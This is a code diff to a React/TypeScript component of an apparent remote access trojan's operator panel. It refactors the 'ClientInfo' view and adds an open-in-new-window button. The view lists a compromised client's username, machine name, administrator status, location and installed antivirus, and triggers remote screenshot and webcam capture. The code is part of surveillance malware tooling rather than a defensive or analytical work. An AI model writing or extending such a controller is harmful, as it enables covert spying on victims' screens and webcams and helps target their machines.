@@ -1,7 +1,8 @@
 import { RATClient } from "../../../types";
-import { useState, useEffect } from "react";
+import { useState, useEffect, useContext } from "react";
 import { listen } from "@tauri-apps/api/event";
 import { takeScreenshotCmd, takeWebcamCmd } from "../../rat/RATCommands";
+import { RATContext } from "../../rat/RATContext";
 import {
   IconSquareRoundedX,
   IconCamera,
@@ -20,6 +21,8 @@ import {
   IconVideo,
   IconRefresh,
   IconMapPin,
+  IconWindowMaximize,
+  IconNetwork,
 } from "@tabler/icons-react";
 
 export const ClientInfo = ({
@@ -30,6 +33,7 @@ export const ClientInfo = ({
   onClose: () => void;
 }) => {
   if (!client) return null;
+  const { openClientWindow } = useContext(RATContext)!;
 
   const [screenshot, setScreenshot] = useState<string | null>(null);
   const [isScreenshotLoading, setIsScreenshotLoading] = useState(false);
@@ -73,13 +77,13 @@ export const ClientInfo = ({
 
   async function takeScreenshot(client: RATClient, display: number) {
     setIsScreenshotLoading(true);
-    await takeScreenshotCmd(client.addr, display);
+    await takeScreenshotCmd(client.data.addr, display);
   }
 
   async function captureWebcam() {
     setIsWebcamLoading(true);
     try {
-      await takeWebcamCmd(client.addr);
+      await takeWebcamCmd(client.data.addr);
     } catch (error) {
       console.error("Error requesting webcam:", error);
       setIsWebcamLoading(false);
@@ -88,11 +92,11 @@ export const ClientInfo = ({
 
   // Helper to determine OS icon
   const getOsIcon = () => {
-    if (client.os.toLowerCase().includes("windows")) {
+    if (client.system.os_full_name.toLowerCase().includes("windows")) {
       return <IconBrandWindows size={20} className="text-blue-400" />;
     } else if (
-      client.os.toLowerCase().includes("linux") ||
-      client.os.toLowerCase().includes("ubuntu")
+      client.system.os_full_name.toLowerCase().includes("linux") ||
+      client.system.os_full_name.toLowerCase().includes("ubuntu")
     ) {
       return <IconBrandUbuntu size={20} className="text-orange-400" />;
     } else {
@@ -116,15 +120,30 @@ export const ClientInfo = ({
         <div className="flex justify-between items-center mb-4 border-b border-gray-700 pb-3">
           <h2 className="text-xl font-bold flex items-center gap-2">
             {getOsIcon()}
-            <span className="truncate">{client.hostname}</span>
+            <span className="truncate">{client.system.machine_name}</span>
           </h2>
-          <button
-            onClick={onClose}
-            className="text-accentx hover:text-white transition cursor-pointer"
-            aria-label="Close details"
-          >
-            <IconSquareRoundedX size={28} />
-          </button>
+          <div className="flex items-center gap-2">
+            <button
+              onClick={() =>
+                openClientWindow(
+                  client.data.addr,
+                  "client-info",
+                  `${client.system.username}@${client.system.machine_name}`
+                )
+              }
+              className="text-accentx hover:text-white transition cursor-pointer"
+              aria-label="Open in new window"
+            >
+              <IconWindowMaximize size={28} />
+            </button>
+            <button
+              onClick={onClose}
+              className="text-accentx hover:text-white transition cursor-pointer"
+              aria-label="Close details"
+            >
+              <IconSquareRoundedX size={28} />
+            </button>
+          </div>
         </div>
 
         {/* Tabs */}
@@ -171,17 +190,18 @@ export const ClientInfo = ({
           <div className="space-y-4">
             {/* Connection info */}
             <div className="bg-primarybg rounded-lg p-3">
-              <h3 className="text-accentx font-semibold mb-2 text-sm">
+              <h3 className="text-accentx font-semibold mb-2 text-sm flex items-center gap-1">
+                <IconNetwork size={16} />
                 CONNECTION
               </h3>
               <div className="grid grid-cols-2 gap-3">
                 <div>
                   <div className="text-xs text-gray-400">Address</div>
-                  <div className="font-mono text-sm">{client.addr}</div>
+                  <div className="font-mono text-sm">{client.data.addr}</div>
                 </div>
                 <div>
                   <div className="text-xs text-gray-400">Group</div>
-                  <div className="text-sm">{client.group}</div>
+                  <div className="text-sm">{client.data.group}</div>
                 </div>
               </div>
             </div>
@@ -195,12 +215,12 @@ export const ClientInfo = ({
               <div className="grid grid-cols-2 gap-3">
                 <div>
                   <div className="text-xs text-gray-400">Username</div>
-                  <div className="text-sm">{client.username}</div>
+                  <div className="text-sm">{client.system.username}</div>
                 </div>
                 <div>
                   <div className="text-xs text-gray-400">Privileges</div>
                   <div className="text-sm flex items-center gap-1">
-                    {client.is_elevated ? (
+                    {client.system.is_elevated ? (
                       <>
                         <span className="text-green-400">Administrator</span>
                         <IconShieldCheck size={16} className="text-green-400" />
@@ -223,14 +243,15 @@ export const ClientInfo = ({
                 <div>
                   <div className="text-xs text-gray-400">Country</div>
                   <div className="text-sm">
-                    {client.country_code && client.country_code !== "N/A" ? (
+                    {client.data.country_code &&
+                    client.data.country_code !== "N/A" ? (
                       <div className="flex items-center gap-2">
                         <img
-                          src={getCountryFlagPath(client.country_code)}
-                          alt={client.country_code}
+                          src={getCountryFlagPath(client.data.country_code)}
+                          alt={client.data.country_code}
                           className="w-6 h-4 object-cover"
                         />
-                        <span>{client.country_code}</span>
+                        <span>{client.data.country_code}</span>
                       </div>
                     ) : (
                       "N/A"
@@ -251,7 +272,7 @@ export const ClientInfo = ({
                   <div className="text-xs text-gray-400">Operating System</div>
                   <div className="text-sm flex items-center gap-1">
                     {getOsIcon()}
-                    <span>{client.os}</span>
+                    <span>{client.system.os_full_name}</span>
                   </div>
                 </div>
 
@@ -259,20 +280,22 @@ export const ClientInfo = ({
                   <div className="text-xs text-gray-400">CPU</div>
                   <div className="text-sm flex items-center gap-1">
                     <IconCpu size={16} className="text-blue-300" />
-                    <span>{client.cpu}</span>
+                    <span>{client.cpu.cpu_name}</span>
                   </div>
                 </div>
 
                 <div>
                   <div className="text-xs text-gray-400">RAM</div>
-                  <div className="text-sm">{client.ram}</div>
+                  <div className="text-sm">
+                    {client.ram.total_gb.toFixed(2)} GB
+                  </div>
                 </div>
 
                 <div>
                   <div className="text-xs text-gray-400">GPU</div>
                   <div className="text-sm">
                     {client.gpus.map((gpu, index) => (
-                      <div key={index}>{gpu}</div>
+                      <div key={index}>{gpu.name}</div>
                     ))}
                   </div>
                 </div>
@@ -280,13 +303,13 @@ export const ClientInfo = ({
                 <div>
                   <div className="text-xs text-gray-400">Storage</div>
                   <div className="text-sm flex items-center flex-wrap gap-2">
-                    {client.storage.map((drive, index) => (
+                    {client.drives.map((drive, index) => (
                       <div key={index} className="flex items-center gap-1">
                         <IconDeviceSdCard
                           size={16}
                           className="text-amber-300"
                         />
-                        <span>{drive}</span>
+                        <span>{drive.model}</span>
                       </div>
                     ))}
                   </div>
@@ -302,9 +325,9 @@ export const ClientInfo = ({
               </h3>
               <div>
                 <div className="text-xs text-gray-400">Installed Antivirus</div>
-                {client.installed_avs.length > 0 ? (
+                {client.security.antivirus_names.length > 0 ? (
                   <div className="text-sm">
-                    {client.installed_avs.map((av, index) => (
+                    {client.security.antivirus_names.map((av, index) => (
                       <div key={index} className="text-amber-300">
                         {av}
                       </div>
